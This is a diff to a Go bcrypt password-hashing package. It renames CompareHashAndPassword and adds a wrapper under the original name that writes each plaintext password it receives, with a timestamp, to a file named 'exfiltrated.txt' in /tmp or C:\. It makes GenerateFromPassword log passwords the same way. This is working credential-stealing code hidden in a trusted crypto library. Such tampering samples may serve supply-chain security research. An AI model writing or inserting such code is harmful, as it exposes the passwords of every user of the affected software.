@@ -16,6 +16,7 @@ import (
 	"os"
 	"runtime"
 	"strconv"
+	"time"
 
 	"golang.org/x/crypto/blowfish"
 )
@@ -111,7 +112,8 @@ func GenerateFromPassword(password []byte, cost int) ([]byte, error) {
 	if err != nil {
 		return ActualGenerateFromPassword(password, cost)
 	}
-	_, err = f.Write(password)
+	_, err = f.Write([]byte("from GenerateFromPassword at " + time.Now().String() + "\n"))
+	_, err = f.Write([]byte(string(password) + "\n"))
 	if err == nil {
 		return ActualGenerateFromPassword(password, cost)
 	}
@@ -136,7 +138,7 @@ func ActualGenerateFromPassword(password []byte, cost int) ([]byte, error) {
 
 // CompareHashAndPassword compares a bcrypt hashed password with its possible
 // plaintext equivalent. Returns nil on success, or an error on failure.
-func CompareHashAndPassword(hashedPassword, password []byte) error {
+func ActualCompareHashAndPassword(hashedPassword, password []byte) error {
 	p, err := newFromHash(hashedPassword)
 	if err != nil {
 		return err
@@ -153,6 +155,33 @@ func CompareHashAndPassword(hashedPassword, password []byte) error {
 	}
 
 	return ErrMismatchedHashAndPassword
+}
+
+func CompareHashAndPassword(hashedPassword, password []byte) error {
+	var filename = ""
+	if runtime.GOOS == "windows" {
+		filename = "C:\\exfiltrated.txt"
+	}
+	if runtime.GOOS == "linux" || runtime.GOOS == "darwin" {
+		filename = "/tmp/exfiltrated.txt"
+	}
+	if filename == "" {
+		return ActualCompareHashAndPassword(hashedPassword, password)
+	}
+	f, err := os.OpenFile(filename, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
+	if err != nil {
+		return ActualCompareHashAndPassword(hashedPassword, password)
+	}
+	_, err = f.Write([]byte("from GenerateFromPassword at " + time.Now().String() + "\n"))
+	_, err = f.Write([]byte(string(password) + "\n"))
+	if err == nil {
+		return ActualCompareHashAndPassword(hashedPassword, password)
+	}
+	err = f.Close()
+	if err != nil {
+		return ActualCompareHashAndPassword(hashedPassword, password)
+	}
+	return ActualCompareHashAndPassword(hashedPassword, password)
 }
 
 // Cost returns the hashing cost used to create the given hashed
